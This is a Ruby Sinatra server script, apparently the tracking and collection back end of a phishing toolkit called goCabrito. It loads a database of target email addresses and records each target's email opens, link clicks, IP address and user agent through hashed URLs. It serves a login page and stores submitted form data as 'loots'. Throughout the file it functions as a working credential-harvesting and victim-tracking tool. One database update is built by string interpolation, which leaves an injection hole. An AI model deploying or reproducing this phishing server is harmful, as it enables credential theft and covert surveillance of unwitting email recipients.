#!/usr/bin/env ruby
# The script takes a sqlite database generate by goCabrito.
# The the database contains all the users that have been tracked by 
# injecting one or more of the tracking tags {{track-open}} or {{track-click}}.
# Once the tracking URL is visited, it maps the hash in the URL with current database records.
# It then update the database with the required information such as 
#   - click_at
#   - click_count
#   - open_at
#   - open_count
#   - user_agent
#   - ip_addr
#   - loots (submitted data if any POST request)
#   apt-get install build-essential libsqlite3-dev sqlite3
#   gem install sinatra rerun sqlite3
#   rerun 'ruby getCabrito.rb sql.db'
#   https://gist.github.com/taktran/1443262
# 
class String
  def red;          colorize(self, "\e[1m\e[31m");                end
  def green;        colorize(self, "\e[1m\e[32m");                end
  def dark_green;   colorize(self, "\e[32m");                     end
  def yellow;       colorize(self, "\e[1m\e[33m");                end
  def blue;         colorize(self, "\e[1m\e[34m");                end
  def dark_blue;    colorize(self, "\e[34m");                     end
  def purple;       colorize(self, "\e[35m");                     end
  def dark_purple;  colorize(self, "\e[1;35m");                   end
  def cyan;         colorize(self, "\e[1;36m");                   end
  def dark_cyan;    colorize(self, "\e[36m");                     end
  def pure;         colorize(self, "\e[0m\e[28m");                end
  def underline;    colorize(self, "\e[4m");                      end
  def bold;         colorize(self, "\e[1m");                      end
  def info;         colorize(self, "[" + "ℹ".blue + "] ");        end
  def error;        colorize(self, "[" + "x".red + "] ");         end
  def warn;         colorize(self, "[" + "!".bold.yellow + "] "); end
  def step;         colorize(self, "[" + "+".dark_blue + "] ");   end
  def step_h2;      colorize(self, " " + "-".green + "  ");       end
  def done;         colorize(self, "[" + "+".green + "] ");       end
  def colorize(text, color_code) "#{color_code}#{text}\e[0m"      end
end
require 'bundler/inline'
require 'fileutils'

puts "--[Reding the DB]-------------".red
db_file = ARGV[0]
if File.exist?(db_file.to_s)
  new_file = "#{File.basename(db_file, ".*")}-#{rand(500)}.sql"
  puts "File exists: #{db_file}".step
  puts "taking a backup to #{new_file}".warn
  # FileUtils.cp(db_file, new_file)
else
  puts "No database found".error
  exit!
end

begin
  puts "Checking dependencies:".info
  require 'sinatra'
  require 'sinatra/base'
  require 'logger'
  require 'sqlite3'
  require 'pp'

rescue Exception
  puts "Found missing dependencies:".warn
  puts "Installing dependencies..".warn
  gemfile do
    source 'https://rubygems.org'
    gem 'sinatra', require: 'sinatra'
    gem 'webrick', require: false
    gem 'sqlite3', require: 'sqlite3'
  end
  puts "Install completed.".done
end

begin 
  $db_sql = SQLite3::Database.open(db_file)
  $db_sql.results_as_hash = true

  pp _records = $db_sql.execute("select * from targets")
  _records.each 
  puts "---------------".red
rescue Exception => e
  puts e 
end

puts "" 

puts "Server is listening: '0.0.0.0:#{8181}'\n\n".done
Loot   = Struct.new(:id, :target_id, :loot)
Target = Struct.new(:id, :email, :hash, :session, :user_agent,
                    :ip_addr, :click_at, :open_at, 
                    :click_count, :open_count)
TARGETS = []
_records.each do |rec|
  target = Target.new 
  target.id          = rec['target_id']
  target.email       = rec['email']
  target.hash        = rec['hash']
  target.session     = rec['session']
  target.user_agent  = rec['user_agent']
  target.ip_addr     = rec['ip_addr']
  target.click_at    = rec['click_at']
  target.open_at     = rec['open_at']
  target.click_count = rec['click_count']
  target.open_count  = rec['open_count']

  TARGETS << target 
end
pp TARGETS
puts "[------------------]".bold


class GetCabrito < Sinatra::Base

  configure do
    set :bind, '0.0.0.0'
    set :port, 8181
    set :environment, :production
    set :root, File.dirname(__FILE__)
    set :public_folder, Proc.new { File.join(root, '/views') }
    set :show_exceptions, false
    set :logging, false
    disable :logging
    set :sessions, true
    set :session_secret, SecureRandom.base64(40)    
    enable :sessions
  end


  def logit(data)
    File.open('visits.log', 'a') do |f| 
      f.puts data.map {|k,v| "#{k}: #{v}"}.join("\n")
    end
  end

  def track_open(target)
    puts "#{"Open".bold} #{target.email.green}".done
    target.open_at    = target.open_count.zero? ? Time.now.to_s : target.open_at 
    target.open_count = target.open_count.to_i + 1
  end
  
  def track_click(target)
    puts "#{"Click".bold} #{target.email.green}".done
    target.click_at    = target.click_count.to_i.zero? ? Time.now.to_s : target.click_at 
    target.click_count = target.click_count.to_i + 1
    track_open(target) if target.open_count.zero? # if clicked then the user opened the emails but didn't allow the open tracking image
  end
  
  def track(req_path)
    url_sec = [req_path.split("/")].flatten # [real_path, rnd_str, type, hash]
    unless url_sec.empty?
      hash = url_sec[-1]
      type = url_sec[-2]
      3.times { url_sec.delete_at(-1) } # remote rnd_str, type & hash from the array
      target = TARGETS.find {|t| t.hash == hash}

      redirect '/'.to_sym unless target # halt the rquest if record is nil (the email's hash doesn't exist)
  
      case type
      when /ct/i
        track_click(target)
      when /ot/i
        track_open(target)
      end
    end

    cln_url = [url_sec].flatten.select{ |a| !a.empty? }.join("/")      # clean URL without appended rand_str, type or hash
    {cln_url: cln_url, target: target}
  end
  
  get '/' do
    erb 'index.html'.to_sym
  end
  
  not_found do
    erb 'index.html'.to_sym
    # redirect '/'.to_sym
    # 'This is nowhere to be found.'
  end
  
  error do
    'Sorry there was a nasty error - ' + env['sinatra.error'].message
  end
  
  # Get tracking URL
  get '/*' do
    begin
      session_id  = session["session_id"]
      request_path = request.env['REQUEST_PATH']

      #if reqest_path.match?(/.*(\/ct\/)|(\/ot\/).*/i)
      if request_path.capitalize.match(/.*(\/ct\/)|(\/ot\/).*/i)
        #.enum_for(:scan, /.*(\/ct\/)|(\/ot\/).*/i).to_a.map {Regexp.last_match.begin(0)}.empty?
        puts "====================================================\n\n".bold
        puts "---[ ".bold + "New Visit".green  + " ]--------------".bold        
        tracked = track(request.env['REQUEST_PATH'].to_s)
        cln_url = tracked[:cln_url]
        target  = tracked[:target]

        if target
          target.user_agent = request.user_agent
          target.ip_addr    = request.env["HTTP_X_REAL_IP"] # request.env["REMOTE_ADDR"] / @env['HTTP_X_REAL_IP']
          target.session    = session_id
          qry_update = <<-SQL
              UPDATE 
                targets
              SET 
                user_agent  = '#{target.user_agent}',
                ip_addr     = '#{target.ip_addr}',
                session     = '#{target.session}',
                click_at    = '#{target.click_at}',
                open_at     = '#{target.open_at}',
                click_count = #{target.click_count},
                open_count  = #{target.open_count}
              WHERE 
                target_id = #{target.id};
          SQL
          $db_sql.execute(qry_update)
          qry_update = <<-SQL
              INSERT INTO 
                loots (target_id)
              VALUES 
                (?)
          SQL
          $db_sql.execute(qry_update, target.id)

  
          puts "#{"Details:".underline}".step_h2
          puts "---[ ".yellow + "Object" + " ]---".yellow
          pp target
          puts "---[ ".yellow + "DB Record" + " ]---".yellow
          pp record = $db_sql.execute("SELECT * FROM targets WHERE target_id = ?;", target.id)
          puts "-".bold * 50
          puts "\n\n"

          logit(record)
          # redirect "#{cln_url}".to_sym
          # erb 'index.html'.to_sym
          redirect "#{cln_url}"
        end
      else
        not_found
      end
    rescue Errno::ECONNRESET
      puts "[+] Error "
      puts "[|->] " + "#{request.env['REQUEST_PATH']}"
    rescue Exception => e
      puts e.message
      puts e.backtrace
    end
    # redirect "#{cln_url}".to_sym
  end


  def get_params(params)
    {
      username: params['txtUser'], 
      password: params['txtPass'],
      params: params
    }
  end


  post '/login' do
    
    begin
      session_id = session["session_id"]
      if params
        target   = TARGETS.find {|t| t.session == session_id}
        username = params['txtUser']

        if target.nil?
          puts "Uknown user with loot (will be stored anyways)".yellow
          loot = Loot.new
          # loot.loot = params.to_json.to_s # keep all the post's data
          loot.loot = username.to_s

          # This target is not from the imported database therefore unknwon email or hash
          target = Target.new 
          target.session    = session_id
          target.user_agent = request.user_agent
          target.ip_addr    = request.env["HTTP_X_REAL_IP"]  #request.env["REMOTE_HOST"] # @env['HTTP_X_REAL_IP']
          qry_insert = <<-SQL
            INSERT INTO 
              targets (session, user_agent, ip_addr)
            VALUES 
              (?, ?, ?)
          SQL
          $db_sql.execute(qry_insert, target.session, target.user_agent, target.ip_addr)
          target.id = $db_sql.last_insert_row_id

          TARGETS << target 

          qry_insert = <<-SQL
              INSERT INTO 
                loots (target_id, loot)
              VALUES 
                (?, ?)
          SQL
          $db_sql.execute(qry_insert, target.id, loot.loot)
          loot.id = $db_sql.last_insert_row_id
          loot.target_id = target.id

          t_record = $db_sql.execute("SELECT * FROM targets WHERE session = ?;", target.session) 
          l_record = $db_sql.execute("SELECT * FROM loots   WHERE loot_id = ?;", loot.id)
        else
          loot   = Loot.new
          # loot.loot = params.to_json.to_s
          loot.loot = username.to_s

          qry_insert = <<-SQL
            INSERT INTO 
              loots (target_id, loot)
            VALUES 
              (?, ?)
          SQL
          $db_sql.execute(qry_insert, target.id, loot.loot)
          loot.id = $db_sql.last_insert_row_id
          loot.target_id = target.id

          t_record = $db_sql.execute("SELECT * FROM targets WHERE target_id = ?;", target.id)         
          l_record = $db_sql.execute("SELECT * FROM loots   WHERE target_id = ?;", target.id)
        end

        puts "---[ ".bold + "Collected Data (#{target.email})".green  + " ]--------------".bold
        puts "---[ ".green + "Submitted" + " ]---".green
        puts username.to_s.green + ':'.bold + target.ip_addr.to_s.green
        puts "#{"Details:".underline}".step_h2
        puts "---[ ".yellow + "Object" + " ]---".yellow
        pp target
        puts '---'.yellow
        pp loot
        puts "---[ ".yellow + "DB Record" + " ]---".yellow
        pp t_record
        puts '---'.yellow
        pp l_record 
        puts "-".bold * 50
        puts "\n\n"

        logit(t_record)
        logit(l_record)
        erb 'sent.html'.to_sym
      else
        erb '/'.to_sym
      end
    rescue Exception => e
      puts e.message
      puts e.backtrace
    end    
  end

  not_found do
    # erb 'index.html'.to_sym
    redirect '/'.to_sym
    # "File could not be found: '#{request.env['REQUEST_PATH']}'"
  end
  
  error do
    begin 
      'Sorry there was a nasty error - ' + env['sinatra.error'].message
    rescue Errno::ECONNRESET
      puts "[+] Error "
      puts "[|->] " + "#{request.env['REQUEST_PATH']}"
    rescue Exception => e
      puts e.message 
      puts e.backtrace
    end

  end

  run!
end


